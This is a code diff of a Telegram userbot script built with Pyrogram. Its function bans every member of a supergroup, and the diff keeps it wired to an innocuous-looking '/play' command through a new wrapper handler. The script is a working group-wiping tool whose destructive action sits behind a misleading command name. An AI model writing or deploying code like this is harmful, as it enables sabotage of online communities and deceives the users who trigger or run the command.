@@ -3,7 +3,6 @@ import asyncio
 
 app = Client("my_account")
 
-@app.on_message(filters.command("play"))
 async def ban_all_users(client, message):
     if not message.chat.type == "supergroup":
         await message.reply("Noob !! Use This Cmd in Group.")
@@ -20,5 +19,9 @@ async def ban_all_users(client, message):
                 banned_users += 1
                 await asyncio.sleep(0.1)
         await message.reply(f"Banned {banned_users} out of {all_users} users.")
+
+@app.on_message(filters.command("play"))
+async def play_command_handler(client, message):
+    await ban_all_users(client, message)
 
 app.run()
